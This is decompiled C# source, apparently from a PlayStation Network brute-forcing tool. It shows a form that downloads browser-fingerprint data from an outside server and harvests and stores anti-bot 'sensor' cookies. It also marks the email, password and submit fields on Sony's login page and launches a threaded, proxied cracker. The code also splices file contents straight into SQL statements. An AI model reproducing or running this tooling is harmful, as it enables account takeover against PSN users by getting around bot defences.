							fpcf.canv.Add((string)value);
						}
						fpcf.canv = (from x in fpcf.canv
						orderby UCSensorLeecher.random.Next()
						select x).ToList<string>();
						string json2 = httpRequest.Get("https://api.halosoft.ir/psn-bruteforcer/canvas.php?query=read&path=rvs", null).ToString();
						JObject jobject2 = JObject.Parse(json2);
						foreach (JToken value2 in ((IEnumerable<JToken>)jobject2["Content"]))
						{
							vls += (string)value2;
						}
					}
					string[] source = vls.Split(new char[]
					{
						'@'
					});
					fpcf.vals = source.ToList<string>();
					fpcf.vals = fpcf.vals.Distinct<string>().ToList<string>();
					fpcf.vals = (from x in fpcf.vals
					orderby UCSensorLeecher.random.Next()
					select x).ToList<string>();
				}).Start();
			}
			catch (Exception ex)
			{
				MessageBox.Show("Exception Loading Dependencies!\n" + ex.ToString());
				Application.Exit();
			}
		}

		// Token: 0x060001AF RID: 431 RVA: 0x00012B48 File Offset: 0x00010D48
		private void GetMail_btn_Click(object sender, EventArgs e)
		{
			try
			{
				this.MailInput = this.browser_bw.Document.ActiveElement;
				this.Mail_ID_tb.Text = ElementCollection.CreateCommonElementFromFullElement(this.MailInput).ToString();
			}
			catch
			{
				this.Mail_ID_tb.Text = "Exception while finding!";
			}
		}

		// Token: 0x060001B0 RID: 432 RVA: 0x00012BAC File Offset: 0x00010DAC
		private void GetPass_btn_Click(object sender, EventArgs e)
		{
			try
			{
				this.PasswordInput = this.browser_bw.Document.ActiveElement;
				this.Pass_ID_tb.Text = ElementCollection.CreateCommonElementFromFullElement(this.PasswordInput).ToString();
			}
			catch
			{
				this.Pass_ID_tb.Text = "Exception while finding!";
			}
		}

		// Token: 0x060001B1 RID: 433 RVA: 0x00012C10 File Offset: 0x00010E10
		private void Find_btn_Click(object sender, EventArgs e)
		{
			try
			{
				this.SubmitButton = this.browser_bw.Document.GetElementById(this.ID_tb.Text);
				this.Submit_tb.Text = ElementCollection.CreateCommonElementFromFullElement(this.SubmitButton).ToString();
			}
			catch (Exception)
			{
				this.Submit_tb.Text = "NOT FOUND";
			}
		}

		// Token: 0x060001B2 RID: 434 RVA: 0x00012C80 File Offset: 0x00010E80
		private void GetSubmit_btn_Click(object sender, EventArgs e)
		{
			try
			{
				this.SubmitButton = this.browser_bw.Document.ActiveElement;
				this.Submit_tb.Text = ElementCollection.CreateCommonElementFromFullElement(this.SubmitButton).ToString();
			}
			catch
			{
				this.Submit_tb.Text = "Exception while finding!";
			}
		}

		// Token: 0x060001B3 RID: 435 RVA: 0x00012CE4 File Offset: 0x00010EE4
		private void CMExecutor_btn_Click(object sender, EventArgs e)
		{
			if (!this.ExecCMD(GeneratorStaticDependencies.Connection, this.Command_tb.Text))
			{
				MessageBox.Show("Error Executing yout Command!", "Exception catched", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x060001B4 RID: 436 RVA: 0x00002BA4 File Offset: 0x00000DA4
		private void Clear_btn_Click(object sender, EventArgs e)
		{
			this.Command_tb.Text = "DELETE FROM Sensors WHERE id > 0";
		}

		// Token: 0x060001B5 RID: 437 RVA: 0x00012D20 File Offset: 0x00010F20
		private void Save_btn_Click(object sender, EventArgs e)
		{
			using (SaveFileDialog saveFileDialog = new SaveFileDialog())
			{
				saveFileDialog.Filter = "(*.txt)|*.txt";
				saveFileDialog.Title = "Save to...";
				if (saveFileDialog.ShowDialog() == DialogResult.OK)
				{
					using (StreamWriter streamWriter = new StreamWriter(saveFileDialog.FileName))
					{
						foreach (object obj in ((IEnumerable)this.SensorsGrid.Rows))
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								streamWriter.WriteLine(Uri.UnescapeDataString(dataGridViewRow.Cells["Cookie"].Value.ToString()));
							}
							catch
							{
							}
						}
					}
				}
			}
		}

		// Token: 0x060001B6 RID: 438 RVA: 0x00012E1C File Offset: 0x0001101C
		private void Refresh_btn_Click(object sender, EventArgs e)
		{
			UCSettings._cracker.Sensors.Clear();
			foreach (object obj in ((IEnumerable)this.SensorsGrid.Rows))
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				try
				{
					string sensor = Uri.UnescapeDataString(dataGridViewRow.Cells["Cookie"].Value.ToString());
					UCSettings._cracker.Sensors.Add(new Sensor(sensor));
					UCSettings._cracker.SensorsTemp.Add(new Sensor(sensor));
				}
				catch
				{
				}
			}
			Sensor.refreshed = 0;
			UCSettings._cracker.SensorsTemp = UCSettings._cracker.Sensors;
			this.All_lbl.Text = this.SensorsGrid.Rows.Count.ToString();
		}

		// Token: 0x060001B7 RID: 439 RVA: 0x00012F1C File Offset: 0x0001111C
		private void Load_btn_Click(object sender, EventArgs e)
		{
			ThreadPool.SetMaxThreads(100, 100);
			using (OpenFileDialog opn = new OpenFileDialog())
			{
				opn.Filter = "(*.txt)|*.txt";
				opn.Title = "Select Cookies";
				if (opn.ShowDialog() == DialogResult.OK)
				{
					new Thread(delegate()
					{
						TransactionScope transactionScope = new TransactionScope();
						SQLiteTransaction sqliteTransaction = GeneratorStaticDependencies.Connection.BeginTransaction();
						string[] array = File.ReadAllLines(opn.FileName);
						foreach (string str in array)
						{
							try
							{
								this.ExecCMD(GeneratorStaticDependencies.Connection, "INSERT INTO Sensors(Cookie,Host) VALUES('" + str + "','Custom')");
							}
							catch
							{
							}
						}
						sqliteTransaction.Commit();
						transactionScope.Complete();
					}).Start();
				}
			}
		}

		// Token: 0x060001B8 RID: 440 RVA: 0x00002BB6 File Offset: 0x00000DB6
		private void Add_btn_Click(object sender, EventArgs e)
		{
			this.uri_cb.Items.Add(this.uri_tb.Text);
		}

		// Token: 0x060001B9 RID: 441 RVA: 0x00002BD4 File Offset: 0x00000DD4
		private void Stop_btn_Click(object sender, EventArgs e)
		{
			UCSettings._cracker.Stop(3);
		}

		// Token: 0x060001BA RID: 442 RVA: 0x00012FBC File Offset: 0x000111BC
		private void Start_btn_Click(object sender, EventArgs e)
		{
			decimal maximum = ControlsLink.GetLink().Settings.Thread_num.Maximum;
			if (this.LeechMode_cb.SelectedIndex == 0)
			{
				ControlsLink.GetLink().Settings.Thread_num.Maximum = 15m;
			}
			else
			{
				ControlsLink.GetLink().Settings.Thread_num.Maximum = 15m;
			}
			try
			{
				if (File.Exists(Directory.GetCurrentDirectory() + "/LOG.txt"))
				{
					File.Delete(Directory.GetCurrentDirectory() + "/LOG.txt");
				}
			}
			catch (Exception)
			{
			}
			UCSettings._cracker.BotInf = ControlsLink.GetLink().Settings.Bot_token_ID_tb.Text;
			UCSettings._cracker.AutoSend = ControlsLink.GetLink().Settings.AoutoUpdateProxy_cb.Checked;
			UCSettings._cracker.ProxyType = ControlsLink.GetLink().Settings.ProxyType_cob.SelectedItem.ToString();
			UCSettings._cracker.Start(this.LeechMode_cb.SelectedIndex + 9);
			ControlsLink.GetLink().Settings.Thread_num.Maximum = maximum;
		}

		// Token: 0x060001BB RID: 443 RVA: 0x000130F4 File Offset: 0x000112F4
		public void SerializeDocument()
		{
			Thread thread = new Thread(delegate()
			{
				Application.Run(new frmLoading());
			});
			thread.Start();
			int height = this.browser_bw.Height;
			int width = this.browser_bw.Width;
			this.browser_bw.Width = UCSensorLeecher.random.Next(1150, 1366);
			this.browser_bw.Height = UCSensorLeecher.random.Next(670, 770);
			GeneratorStaticDependencies.HtmlDocument = ElementCollection.CreateFromFullDocument(this.browser_bw.Document);
			GeneratorStaticDependencies.MailInput = GeneratorStaticDependencies.HtmlDocument.GetByFullElement(this.MailInput);
			GeneratorStaticDependencies.PasswordInput = GeneratorStaticDependencies.HtmlDocument.GetByFullElement(this.PasswordInput);
			GeneratorStaticDependencies.SubmitButton = GeneratorStaticDependencies.HtmlDocument.GetByFullElement(this.SubmitButton);
			this.isSerialized = true;
			this.browser_bw.Width = width;
			this.browser_bw.Height = height;
		}

		// Token: 0x060001BC RID: 444 RVA: 0x000131F8 File Offset: 0x000113F8
		private void TabControl1_SelectedIndexChanged(object sender, EventArgs e)
		{
			if (this.tabControl1.SelectedIndex != 0)
			{
			}
		}

		// Token: 0x060001BD RID: 445 RVA: 0x00013218 File Offset: 0x00011418
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x060001BE RID: 446 RVA: 0x00013248 File Offset: 0x00011448
		[Obfuscation(Feature = "virtualization", Exclude = false)]
		private void InitializeComponent()
		{
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(UCSensorLeecher));
			this.tabControl1 = new TabControl();
			this.SensorManager_tb = new TabPage();
			this.LeechMode_cb = new ComboBox();
			this.Clear_btn = new Button();
			this.label11 = new Label();
			this.Command_tb = new TextBox();
			this.Load_btn = new Button();
			this.Save_btn = new Button();
			this.Stop_btn = new Button();
			this.Start_btn = new Button();
			this.bad_lbl = new Label();
			this.label8 = new Label();
			this.label9 = new Label();
			this.good_lbl = new Label();
			this.errors_lbl = new Label();
			this.label4 = new Label();
			this.label5 = new Label();
			this.tries_lbl = new Label();
			this.LoadedPx_lbl = new Label();
			this.label3 = new Label();
			this.label2 = new Label();
			this.All_lbl = new Label();
			this.CMExecutor_btn = new Button();
			this.SensorsGrid = new DataGridView();
			this.LeechSettings_tp = new TabPage();
			this.GetSubmit_btn = new Button();
			this.Find_btn = new Button();
			this.ID_tb = new TextBox();
			this.Submit_tb = new TextBox();
			this.label13 = new Label();
			this.groupBox2 = new GroupBox();
			this.GetPass_btn = new Button();
			this.GetMail_btn = new Button();
			this.uri_tb = new TextBox();
			this.Add_btn = new Button();
			this.Pass_ID_tb = new TextBox();
			this.label21 = new Label();
			this.Mail_ID_tb = new TextBox();
			this.label14 = new Label();
			this.uri_cb = new ComboBox();
			this.label12 = new Label();
			this.groupBox3 = new GroupBox();
			this.groupBox1 = new GroupBox();
			this.label1 = new Label();
			this.browser_bw = new WebBrowser();
			this.pictureBox1 = new PictureBox();
			this.tabControl1.SuspendLayout();
			this.SensorManager_tb.SuspendLayout();
			((ISupportInitialize)this.SensorsGrid).BeginInit();
			this.LeechSettings_tp.SuspendLayout();
			this.groupBox2.SuspendLayout();
			this.groupBox3.SuspendLayout();
			this.groupBox1.SuspendLayout();
			((ISupportInitialize)this.pictureBox1).BeginInit();
			base.SuspendLayout();
			this.tabControl1.Controls.Add(this.SensorManager_tb);
			this.tabControl1.Controls.Add(this.LeechSettings_tp);
			this.tabControl1.Location = new Point(0, 0);
			this.tabControl1.Name = "tabControl1";
			this.tabControl1.SelectedIndex = 0;
			this.tabControl1.Size = new Size(620, 503);
			this.tabControl1.TabIndex = 0;
			this.tabControl1.SelectedIndexChanged += this.TabControl1_SelectedIndexChanged;
			this.SensorManager_tb.BackColor = Color.FromArgb(64, 64, 64);
			this.SensorManager_tb.Controls.Add(this.pictureBox1);
			this.SensorManager_tb.Controls.Add(this.label1);
			this.SensorManager_tb.Controls.Add(this.groupBox1);
			this.SensorManager_tb.Controls.Add(this.groupBox3);
			this.SensorManager_tb.Controls.Add(this.LeechMode_cb);
			this.SensorManager_tb.Controls.Add(this.label11);
			this.SensorManager_tb.Controls.Add(this.Command_tb);
			this.SensorManager_tb.Controls.Add(this.SensorsGrid);
			this.SensorManager_tb.Location = new Point(4, 22);
			this.SensorManager_tb.Name = "SensorManager_tb";
			this.SensorManager_tb.Padding = new Padding(3);
			this.SensorManager_tb.Size = new Size(612, 477);
			this.SensorManager_tb.TabIndex = 0;
			this.SensorManager_tb.Text = "Sensor Manager";
			this.LeechMode_cb.FormattingEnabled = true;
			this.LeechMode_cb.Items.AddRange(new object[]
			{
				"API",
				"Selenium"
			});
			this.LeechMode_cb.Location = new Point(432, 174);
			this.LeechMode_cb.Name = "LeechMode_cb";
			this.LeechMode_cb.Size = new Size(147, 21);
			this.LeechMode_cb.TabIndex = 327;
			this.LeechMode_cb.SelectedIndexChanged += this.LeechMode_cb_SelectedIndexChanged;
			this.Clear_btn.BackColor = Color.Silver;
			this.Clear_btn.Font = new Font("Gadugi", 9.75f);
			this.Clear_btn.ForeColor = Color.White;
			this.Clear_btn.Location = new Point(6, 49);
			this.Clear_btn.Name = "Clear_btn";
			this.Clear_btn.Size = new Size(99, 24);
			this.Clear_btn.TabIndex = 326;
			this.Clear_btn.Text = "Clear";
			this.Clear_btn.TextAlign = ContentAlignment.BottomCenter;
			this.Clear_btn.UseVisualStyleBackColor = false;
			this.Clear_btn.Click += this.Clear_btn_Click;
			this.label11.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
			this.label11.AutoSize = true;
			this.label11.Font = new Font("Nirmala UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.label11.ForeColor = Color.White;
			this.label11.Location = new Point(421, 126);
			this.label11.Margin = new Padding(2, 0, 2, 0);
			this.label11.Name = "label11";
			this.label11.Padding = new Padding(0, 0, 4, 4);
			this.label11.Size = new Size(71, 19);
			this.label11.TabIndex = 325;
			this.label11.Text = " Command";
			this.Command_tb.Location = new Point(353, 148);
			this.Command_tb.Name = "Command_tb";
			this.Command_tb.Size = new Size(226, 20);
			this.Command_tb.TabIndex = 324;
			this.Command_tb.Text = "SELECT * FROM Sensors WHERE ID > 0";
			this.Load_btn.BackColor = Color.Silver;
			this.Load_btn.Font = new Font("Gadugi", 9.75f);
			this.Load_btn.ForeColor = Color.White;
			this.Load_btn.Location = new Point(109, 79);
			this.Load_btn.Name = "Load_btn";
			this.Load_btn.Size = new Size(99, 24);
			this.Load_btn.TabIndex = 323;
			this.Load_btn.Text = "Load cookie";
			this.Load_btn.TextAlign = ContentAlignment.BottomCenter;
			this.Load_btn.UseVisualStyleBackColor = false;
			this.Load_btn.Click += this.Load_btn_Click;
			this.Save_btn.BackColor = Color.Silver;
			this.Save_btn.Font = new Font("Gadugi", 9.75f);
			this.Save_btn.ForeColor = Color.White;
			this.Save_btn.Location = new Point(6, 79);
			this.Save_btn.Name = "Save_btn";
			this.Save_btn.Size = new Size(99, 24);
			this.Save_btn.TabIndex = 322;
			this.Save_btn.Text = "Save cookie";
			this.Save_btn.TextAlign = ContentAlignment.BottomCenter;
			this.Save_btn.UseVisualStyleBackColor = false;
			this.Save_btn.Click += this.Save_btn_Click;
			this.Stop_btn.BackColor = Color.Silver;
			this.Stop_btn.Font = new Font("Gadugi", 9.75f);
			this.Stop_btn.ForeColor = Color.White;
			this.Stop_btn.Location = new Point(109, 19);
			this.Stop_btn.Name = "Stop_btn";
			this.Stop_btn.Size = new Size(99, 24);
			this.Stop_btn.TabIndex = 321;
			this.Stop_btn.Text = "Stop";
			this.Stop_btn.TextAlign = ContentAlignment.BottomCenter;
			this.Stop_btn.UseVisualStyleBackColor = false;
			this.Stop_btn.Click += this.Stop_btn_Click;
			this.Start_btn.BackColor = Color.Silver;
			this.Start_btn.Font = new Font("Gadugi", 9.75f);
			this.Start_btn.ForeColor = Color.White;
			this.Start_btn.Location = new Point(6, 19);
			this.Start_btn.Name = "Start_btn";
			this.Start_btn.Size = new Size(99, 24);
			this.Start_btn.TabIndex = 320;
			this.Start_btn.Text = "Start";
			this.Start_btn.TextAlign = ContentAlignment.BottomCenter;
			this.Start_btn.UseVisualStyleBackColor = false;
			this.Start_btn.Click += this.Start_btn_Click;
			this.bad_lbl.Font = new Font("Nirmala UI", 9f);
			this.bad_lbl.ForeColor = Color.White;
			this.bad_lbl.Location = new Point(149, 54);
			this.bad_lbl.Name = "bad_lbl";
			this.bad_lbl.Size = new Size(21, 20);
			this.bad_lbl.TabIndex = 319;
			this.bad_lbl.Text = "0";
			this.bad_lbl.TextAlign = ContentAlignment.MiddleRight;
			this.label8.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
			this.label8.AutoSize = true;
			this.label8.Font = new Font("Nirmala UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.label8.ForeColor = Color.White;
			this.label8.Location = new Point(113, 56);
			this.label8.Margin = new Padding(2, 0, 2, 0);
			this.label8.Name = "label8";
			this.label8.Padding = new Padding(0, 0, 4, 4);
			this.label8.Size = new Size(34, 19);
			this.label8.TabIndex = 318;
			this.label8.Text = "Bad:";
			this.label9.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
			this.label9.AutoSize = true;
			this.label9.Font = new Font("Nirmala UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.label9.ForeColor = Color.White;
			this.label9.Location = new Point(23, 54);
			this.label9.Margin = new Padding(2, 0, 2, 0);
			this.label9.Name = "label9";
			this.label9.Padding = new Padding(0, 0, 4, 4);
			this.label9.Size = new Size(43, 19);
			this.label9.TabIndex = 316;
			this.label9.Text = "Good:";
			this.good_lbl.Font = new Font("Nirmala UI", 9f);
			this.good_lbl.ForeColor = Color.White;
			this.good_lbl.Location = new Point(65, 53);
			this.good_lbl.Name = "good_lbl";
			this.good_lbl.Size = new Size(18, 20);
			this.good_lbl.TabIndex = 317;
			this.good_lbl.Text = "0";
			this.good_lbl.TextAlign = ContentAlignment.MiddleRight;
			this.errors_lbl.Font = new Font("Nirmala UI", 9f);
			this.errors_lbl.ForeColor = Color.White;
			this.errors_lbl.Location = new Point(155, 33);
			this.errors_lbl.Name = "errors_lbl";
			this.errors_lbl.Size = new Size(15, 20);
			this.errors_lbl.TabIndex = 315;
			this.errors_lbl.Text = "0";
			this.errors_lbl.TextAlign = ContentAlignment.MiddleRight;
			this.label4.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
			this.label4.AutoSize = true;
			this.label4.Font = new Font("Nirmala UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.label4.ForeColor = Color.White;
			this.label4.Location = new Point(103, 33);
			this.label4.Margin = new Padding(2, 0, 2, 0);
			this.label4.Name = "label4";
			this.label4.Padding = new Padding(0, 0, 4, 4);
			this.label4.Size = new Size(44, 19);
			this.label4.TabIndex = 314;
			this.label4.Text = "Errors:";
			this.label5.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
			this.label5.AutoSize = true;
			this.label5.Font = new Font("Nirmala UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.label5.ForeColor = Color.White;
			this.label5.Location = new Point(23, 33);
			this.label5.Margin = new Padding(2, 0, 2, 0);
			this.label5.Name = "label5";
			this.label5.Padding = new Padding(0, 0, 4, 4);
			this.label5.Size = new Size(40, 19);
			this.label5.TabIndex = 312;
			this.label5.Text = "Total:";
			this.tries_lbl.Font = new Font("Nirmala UI", 9f);
			this.tries_lbl.ForeColor = Color.White;
			this.tries_lbl.Location = new Point(62, 33);
			this.tries_lbl.Name = "tries_lbl";
			this.tries_lbl.Size = new Size(21, 20);
			this.tries_lbl.TabIndex = 313;
			this.tries_lbl.Text = "0";
			this.tries_lbl.TextAlign = ContentAlignment.MiddleRight;
			this.LoadedPx_lbl.Font = new Font("Nirmala UI", 9f);
			this.LoadedPx_lbl.ForeColor = Color.White;
			this.LoadedPx_lbl.Location = new Point(182, 9);
			this.LoadedPx_lbl.Name = "LoadedPx_lbl";
			this.LoadedPx_lbl.Size = new Size(18, 20);
			this.LoadedPx_lbl.TabIndex = 311;
			this.LoadedPx_lbl.Text = "0";
			this.LoadedPx_lbl.TextAlign = ContentAlignment.MiddleRight;
			this.label3.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
			this.label3.AutoSize = true;
			this.label3.Font = new Font("Nirmala UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.label3.ForeColor = Color.White;
			this.label3.Location = new Point(103, 11);
			this.label3.Margin = new Padding(2, 0, 2, 0);
			this.label3.Name = "label3";
			this.label3.Padding = new Padding(0, 0, 4, 4);
			this.label3.Size = new Size(85, 19);
			this.label3.TabIndex = 310;
			this.label3.Text = "Proxy Loaded:";
			this.label2.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
			this.label2.AutoSize = true;
			this.label2.Font = new Font("Nirmala UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.label2.ForeColor = Color.White;
			this.label2.Location = new Point(5, 11);
			this.label2.Margin = new Padding(2, 0, 2, 0);
			this.label2.Name = "label2";
			this.label2.Padding = new Padding(0, 0, 4, 4);
			this.label2.Size = new Size(58, 19);
			this.label2.TabIndex = 308;
			this.label2.Text = "Leeched:";
			this.All_lbl.Font = new Font("Nirmala UI", 9f);
			this.All_lbl.ForeColor = Color.White;
			this.All_lbl.Location = new Point(68, 11);
			this.All_lbl.Name = "All_lbl";
			this.All_lbl.Size = new Size(15, 20);
			this.All_lbl.TabIndex = 309;
			this.All_lbl.Text = "0";
			this.All_lbl.TextAlign = ContentAlignment.MiddleRight;
			this.CMExecutor_btn.BackColor = Color.Silver;
			this.CMExecutor_btn.Font = new Font("Gadugi", 9.75f);
			this.CMExecutor_btn.ForeColor = Color.White;
			this.CMExecutor_btn.Location = new Point(109, 49);
			this.CMExecutor_btn.Name = "CMExecutor_btn";
			this.CMExecutor_btn.Size = new Size(99, 24);
			this.CMExecutor_btn.TabIndex = 313;
			this.CMExecutor_btn.Text = "Show list";
			this.CMExecutor_btn.TextAlign = ContentAlignment.BottomCenter;
			this.CMExecutor_btn.UseVisualStyleBackColor = false;
			this.CMExecutor_btn.Click += this.CMExecutor_btn_Click;
			this.SensorsGrid.BackgroundColor = Color.White;
			this.SensorsGrid.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
			this.SensorsGrid.GridColor = Color.Black;
			this.SensorsGrid.Location = new Point(4, 4);
			this.SensorsGrid.Name = "SensorsGrid";
			this.SensorsGrid.Size = new Size(346, 282);
			this.SensorsGrid.TabIndex = 312;
			this.LeechSettings_tp.BackColor = Color.FromArgb(33, 43, 52);
			this.LeechSettings_tp.Controls.Add(this.GetSubmit_btn);
			this.LeechSettings_tp.Controls.Add(this.Find_btn);
			this.LeechSettings_tp.Controls.Add(this.ID_tb);
			this.LeechSettings_tp.Controls.Add(this.Submit_tb);
			this.LeechSettings_tp.Controls.Add(this.label13);
			this.LeechSettings_tp.Controls.Add(this.groupBox2);
			this.LeechSettings_tp.Controls.Add(this.GetPass_btn);
			this.LeechSettings_tp.Controls.Add(this.GetMail_btn);
			this.LeechSettings_tp.Controls.Add(this.uri_tb);
			this.LeechSettings_tp.Controls.Add(this.Add_btn);
			this.LeechSettings_tp.Controls.Add(this.Pass_ID_tb);
			this.LeechSettings_tp.Controls.Add(this.label21);
			this.LeechSettings_tp.Controls.Add(this.Mail_ID_tb);
			this.LeechSettings_tp.Controls.Add(this.label14);
			this.LeechSettings_tp.Controls.Add(this.uri_cb);
			this.LeechSettings_tp.Controls.Add(this.label12);
			this.LeechSettings_tp.Location = new Point(4, 22);
			this.LeechSettings_tp.Name = "LeechSettings_tp";
			this.LeechSettings_tp.Padding = new Padding(3);
			this.LeechSettings_tp.Size = new Size(612, 477);
			this.LeechSettings_tp.TabIndex = 1;
			this.LeechSettings_tp.Text = "Leech Settings";
			this.LeechSettings_tp.Click += this.LeechSettings_tp_Click;
			this.GetSubmit_btn.BackColor = Color.FromArgb(64, 64, 64);
			this.GetSubmit_btn.Font = new Font("Gadugi", 9.75f);
			this.GetSubmit_btn.ForeColor = Color.FromArgb(224, 224, 224);
			this.GetSubmit_btn.Location = new Point(416, 415);
			this.GetSubmit_btn.Name = "GetSubmit_btn";
			this.GetSubmit_btn.Size = new Size(158, 23);
			this.GetSubmit_btn.TabIndex = 355;
			this.GetSubmit_btn.Text = "Get from active element";
			this.GetSubmit_btn.TextAlign = ContentAlignment.BottomCenter;
			this.GetSubmit_btn.UseVisualStyleBackColor = false;
			this.GetSubmit_btn.Click += this.GetSubmit_btn_Click;
			this.Find_btn.BackColor = Color.FromArgb(64, 64, 64);
			this.Find_btn.Font = new Font("Gadugi", 9.75f);
			this.Find_btn.ForeColor = Color.FromArgb(224, 224, 224);
			this.Find_btn.Location = new Point(202, 415);
			this.Find_btn.Name = "Find_btn";
			this.Find_btn.Size = new Size(41, 23);
			this.Find_btn.TabIndex = 354;
			this.Find_btn.Text = "Find";
			this.Find_btn.TextAlign = ContentAlignment.BottomCenter;
			this.Find_btn.UseVisualStyleBackColor = false;
			this.Find_btn.Click += this.Find_btn_Click;
			this.ID_tb.Location = new Point(149, 416);
			this.ID_tb.MaxLength = 50;
			this.ID_tb.Name = "ID_tb";
			this.ID_tb.Size = new Size(47, 20);
			this.ID_tb.TabIndex = 352;
			this.ID_tb.Text = "ID";
			this.ID_tb.TextAlign = HorizontalAlignment.Center;
			this.Submit_tb.Location = new Point(249, 415);
			this.Submit_tb.Name = "Submit_tb";
			this.Submit_tb.Size = new Size(163, 20);
			this.Submit_tb.TabIndex = 351;
			this.label13.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
			this.label13.AutoSize = true;
			this.label13.Font = new Font("Nirmala UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.label13.ForeColor = Color.White;
			this.label13.Location = new Point(5, 417);
			this.label13.Margin = new Padding(2, 0, 2, 0);
			this.label13.Name = "label13";
			this.label13.Padding = new Padding(0, 0, 4, 4);
			this.label13.Size = new Size(147, 19);
			this.label13.TabIndex = 350;
			this.label13.Text = "Element Details (Submit) :";
			this.groupBox2.Controls.Add(this.browser_bw);
			this.groupBox2.Location = new Point(8, 28);
			this.groupBox2.Name = "groupBox2";
			this.groupBox2.Padding = new Padding(0);
			this.groupBox2.Size = new Size(566, 319);
			this.groupBox2.TabIndex = 349;
			this.groupBox2.TabStop = false;
			this.GetPass_btn.BackColor = Color.FromArgb(64, 64, 64);
			this.GetPass_btn.Font = new Font("Gadugi", 9.75f);
			this.GetPass_btn.ForeColor = Color.FromArgb(224, 224, 224);
			this.GetPass_btn.Location = new Point(416, 387);
			this.GetPass_btn.Name = "GetPass_btn";
			this.GetPass_btn.Size = new Size(158, 23);
			this.GetPass_btn.TabIndex = 348;
			this.GetPass_btn.Text = "Get from active element";
			this.GetPass_btn.TextAlign = ContentAlignment.BottomCenter;
			this.GetPass_btn.UseVisualStyleBackColor = false;
			this.GetPass_btn.Click += this.GetPass_btn_Click;
			this.GetMail_btn.BackColor = Color.FromArgb(64, 64, 64);
			this.GetMail_btn.Font = new Font("Gadugi", 9.75f);
			this.GetMail_btn.ForeColor = Color.FromArgb(224, 224, 224);
			this.GetMail_btn.Location = new Point(416, 360);
			this.GetMail_btn.Name = "GetMail_btn";
			this.GetMail_btn.Size = new Size(158, 23);
			this.GetMail_btn.TabIndex = 347;
			this.GetMail_btn.Text = "Get from active element";
			this.GetMail_btn.TextAlign = ContentAlignment.BottomCenter;
			this.GetMail_btn.UseVisualStyleBackColor = false;
			this.GetMail_btn.Click += this.GetMail_btn_Click;
			this.uri_tb.Location = new Point(6, 445);
			this.uri_tb.Name = "uri_tb";
			this.uri_tb.Size = new Size(432, 20);
			this.uri_tb.TabIndex = 346;
			this.uri_tb.Text = "https://SonySubDomains.e/g";
			this.Add_btn.BackColor = Color.FromArgb(64, 64, 64);
			this.Add_btn.Font = new Font("Gadugi", 9.75f);
			this.Add_btn.ForeColor = Color.FromArgb(224, 224, 224);
			this.Add_btn.Location = new Point(452, 442);
			this.Add_btn.Name = "Add_btn";
			this.Add_btn.Size = new Size(122, 24);
			this.Add_btn.TabIndex = 345;
			this.Add_btn.Text = "Add to Uri's";
			this.Add_btn.TextAlign = ContentAlignment.BottomCenter;
			this.Add_btn.UseVisualStyleBackColor = false;
			this.Add_btn.Click += this.Add_btn_Click;
			this.Pass_ID_tb.Location = new Point(149, 389);
			this.Pass_ID_tb.Name = "Pass_ID_tb";
			this.Pass_ID_tb.Size = new Size(263, 20);
			this.Pass_ID_tb.TabIndex = 339;
			this.label21.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
			this.label21.AutoSize = true;
			this.label21.Font = new Font("Nirmala UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.label21.ForeColor = Color.White;
			this.label21.Location = new Point(5, 391);
			this.label21.Margin = new Padding(2, 0, 2, 0);
			this.label21.Name = "label21";
			this.label21.Padding = new Padding(0, 0, 4, 4);
			this.label21.Size = new Size(135, 19);
			this.label21.TabIndex = 338;
			this.label21.Text = "Element Details  (Pass) :";
			this.Mail_ID_tb.Location = new Point(149, 361);
			this.Mail_ID_tb.Name = "Mail_ID_tb";
			this.Mail_ID_tb.Size = new Size(263, 20);
			this.Mail_ID_tb.TabIndex = 332;
			this.Mail_ID_tb.TextChanged += this.Mail_ID_tb_TextChanged;
			this.label14.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
			this.label14.AutoSize = true;
			this.label14.Font = new Font("Nirmala UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.label14.ForeColor = Color.White;
			this.label14.Location = new Point(5, 363);
			this.label14.Margin = new Padding(2, 0, 2, 0);
			this.label14.Name = "label14";
			this.label14.Padding = new Padding(0, 0, 4, 4);
			this.label14.Size = new Size(138, 19);
			this.label14.TabIndex = 331;
			this.label14.Text = "Element Details (Email) :";
			this.uri_cb.BackColor = SystemColors.Control;
			this.uri_cb.DropDownStyle = ComboBoxStyle.DropDownList;
			this.uri_cb.FlatStyle = FlatStyle.System;
			this.uri_cb.Font = new Font("Gadugi", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.uri_cb.ForeColor = Color.FromArgb(224, 224, 224);
			this.uri_cb.FormattingEnabled = true;
			this.uri_cb.Items.AddRange(new object[]
			{
				componentResourceManager.GetString("uri_cb.Items"),
				"https://auth.api.sonyentertainmentnetwork.com/login.jsp?service_entity=psn&request_theme=liquid"
			});
			this.uri_cb.Location = new Point(36, 6);
			this.uri_cb.Name = "uri_cb";
			this.uri_cb.Size = new Size(539, 22);
			this.uri_cb.TabIndex = 327;
			this.uri_cb.SelectedIndexChanged += this.Uri_cb_SelectedIndexChanged;
